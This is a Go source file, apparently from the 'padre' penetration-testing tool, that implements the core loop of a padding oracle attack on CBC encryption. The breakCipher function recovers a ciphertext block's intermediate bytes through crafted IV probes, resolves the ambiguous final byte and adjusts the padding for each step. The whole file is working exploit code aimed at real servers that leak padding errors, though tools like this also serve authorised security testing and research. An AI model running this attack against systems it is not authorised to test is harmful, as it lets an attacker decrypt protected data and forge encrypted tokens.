package exploit

/* implementation of Padding Oracle exploit algorithm */

import (
	"fmt"

	"github.com/glebarez/padre/pkg/util"
)

// breaks cipher for a given block of ciphertext
// returns bytes (NullingIV) that are turning underlying plaintext into null-byte sequence when sent as IV
// the NullingIV can then be used in encryption or decryption, depending on what you XOR it with
// the streamFetcher can be passed to deliver bytes in in real-time as soon as they discovered
func (p *Padre) breakCipher(cipherBlock []byte, byteStream chan byte) ([]byte, error) {
	blockLen := len(cipherBlock)

	// output buffer
	output := make([]byte, blockLen)

	// generate chunk of cipher with prepended random IV
	cipherChunk := append(util.RandomSlice(blockLen), cipherBlock...)

	// we start with the last byte of IV
	// and repeat the same procedure for every byte moving backwards
	for pos := blockLen - 1; pos >= 0; pos-- {
		// discover the bytes that do not produce padding error
		// NOTE: at last position there may be 2 such bytes*/
		maxCount := 1
		if pos == blockLen-1 {
			maxCount = 2
		}

		found, err := p.getErrorlessByteValues(cipherChunk, pos, maxCount)
		if err != nil {
			return nil, err
		}

		/* check the results */
		var foundByte *byte
		switch len(found) {
		case 0:
			return nil, fmt.Errorf("failed to break the cipher")
			// return nil, errors.NewErrWithHints(
			// 	fmt.Errorf("failed to break the cipher"),
			// 	errors.Hint.LowerConnections,
			// )
		case 1:
			foundByte = &found[0]
		case 2:
			/* this case can ONLY happen in the last position of the block (see maxCount variable above)
			here, we found 2 bytes that fit without padding oracle error
			the challenge here is to find the one that produced \x01 in plaintext
			the trick is:
				if we modify second-last byte, and padding error still doesn't occur
				then we are sure, that found byte produces \x01 at last position of plaintext
			for more info, you can check this thread:
			https://crypto.stackexchange.com/questions/37608/clarification-on-the-origin-of-01-in-this-oracle-padding-attack
			*/

			// modify second-last byte of IV
			cipherChunk[pos-1]++

			// send additional probes
			for _, b := range found {
				// set last byte to one of the found
				cipherChunk[pos] = b

				// check for padding error
				paddingError, err := p.IsPaddingErrorInChunk(cipherChunk)
				if err != nil {
					return nil, err
				}

				if !paddingError {
					// we found the truly valid byte
					foundByte = &b
					break
				}
			}

			if foundByte == nil {
				return nil, fmt.Errorf("failed to decrypt due to unexpected server behavior")
				// return nil, errors.NewErrWithHints(
				// 	fmt.Errorf("failed to decrypt due to unexpected server behavior"),
				// 	errors.Hint.LowerConnections,
				// )
			}
		}

		// XOR to retrieve output byte
		paddingValue := byte(blockLen - pos)
		outByte := *foundByte ^ paddingValue

		// write to output buffer
		output[pos] = outByte

		// fetch immediately into byteStream if provided
		if byteStream != nil {
			byteStream <- outByte
		}

		// adjust padding for next iteration
		cipherChunk[pos] = *foundByte
		for i := pos; i < blockLen; i++ {
			cipherChunk[i] ^= paddingValue ^ (paddingValue + 1)
		}
	}
	return output, nil
}
